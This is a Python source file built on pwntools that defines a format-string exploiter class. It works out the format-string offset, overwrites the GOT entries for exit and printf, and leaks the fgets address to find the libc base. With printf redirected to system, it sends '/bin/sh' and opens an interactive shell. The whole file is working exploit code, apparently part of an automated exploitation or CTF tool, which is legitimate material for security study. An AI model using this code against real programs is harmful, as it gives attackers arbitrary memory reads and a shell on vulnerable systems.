from pwn import *
from subprocess import Popen, PIPE, check_output

context.log_level = 'DEBUG'


class FmtExploiter:
    def __init__(self, binary, vuln_details):
        self.binary = binary
        context.binary = self.binary.elf
        self.output = b""
        self.last_output = b""
        self.exploit_input = []
        self.position = 0
        self.length = 0
        self.parse_vuln(vuln_details)

    def parse_vuln(self, vuln_details):
        print(vuln_details)
        self.position = vuln_details["position"]
        self.length = vuln_details["length"]
        self.exploit_input = vuln_details["input"]
        self.output = vuln_details["output"]

    def send_payload(self, payload):
        process = self.binary.elf.process()
        self.apply_exploit_input(process, payload)
        output = process.clean()
        log.info("fmt message: {}".format(output))
        return output

    def apply_fmt(self):
        fmt = FmtStr(self.send_payload, numbwritten=self.position)
        offset = fmt.offset

        process = self.binary.elf.process()
        # process = gdb.debug(self.binary.bin_path, '''break main''')
        payload = fmtstr_payload(offset, {self.binary.elf.got['exit']: self.binary.elf.entry}, numbwritten=self.position)
        self.apply_exploit_input(process, payload)

        payload = fmtstr_payload(offset, {self.binary.elf.got['printf']: self.binary.find_function('system')},
                                 numbwritten=self.position)
        self.apply_exploit_input(process, payload)

        self.apply_exploit_input(process, b"/bin/sh\n")

        process.interactive()

    def apply_fmt1(self):
        fmt = FmtStr(self.send_payload, numbwritten=self.position)
        offset = fmt.offset

        process = self.binary.elf.process()
        # process = gdb.debug(self.binary.bin_path, '''break vuln''')
        payload = fmtstr_payload(offset, {self.binary.elf.got['exit']: self.binary.elf.entry}, numbwritten=self.position)
        self.apply_exploit_input(process, payload)
        print("fgets got addr:", pack(self.binary.elf.got['fgets']))

        payload = flat(
            pack(self.binary.elf.got['fgets']),
            '|',
            '%{}$s'.format(offset)
        )
        self.apply_exploit_input(process, payload)
        process.recvuntil(b'|')

        leak_bytes = process.recv(8)
        print("leak bytes:", leak_bytes)
        leak = unpack(leak_bytes.rstrip().ljust(8, b'\x00'))

        self.binary.adjust_libc_base(leak, 'fgets')

        payload = fmtstr_payload(offset, {self.binary.elf.got['printf']: self.binary.find_function('system', True)},
                                 numbwritten=self.position)
        self.apply_exploit_input(process, payload)

        self.apply_exploit_input(process, b"/bin/sh\n")

        process.interactive()

    def arbitrary_read(self, address, process=None):
        fmt = FmtStr(self.send_payload, numbwritten=self.position)
        offset = fmt.offset
        if process is None:
            process = self.binary.elf.process()
        process.clean()
        process.send(b'magic1aa')
        off_fmt = '|%{}$s|'.format(offset + 1).encode()
        payload = flat(
            off_fmt.rjust(context.bytes + 1),
            # b'||||||||',
            pack(address).ljust(context.bytes)
        )
        process.sendline(payload)

        data = process.clean()
        print("data:", data)

        leak_bytes = data.split(b'|')[1].rstrip().ljust(8, b'\x00')
        leak = unpack(leak_bytes)
        self.binary.adjust_libc_base(leak, 'fgets')

        process.interactive()

    def trim_input(self, input):
        input = input.replace(b'\x00', b'')
        ip = b"F" * self.binary.elf.bytes
        chain_length = len(input)
        log.info("total payload length: {}".format(chain_length))
        offset = input.index(ip)
        log.info("buffer offset: {}".format(offset))
        return input[0:offset]

    def apply_exploit_input(self, process, payload):
        current_output = b""
        for i, input in enumerate(self.exploit_input):
            current_output += process.clean()
            ip = b"F" * self.binary.elf.bytes
            if ip not in input:
                process.send(input)
            else:
                exploit_payload = [
                    self.trim_input(input),
                    payload
                ]
                exploit_payload = b"".join(exploit_payload)
                process.sendline(exploit_payload)

        log.info("current output: {}".format(current_output))

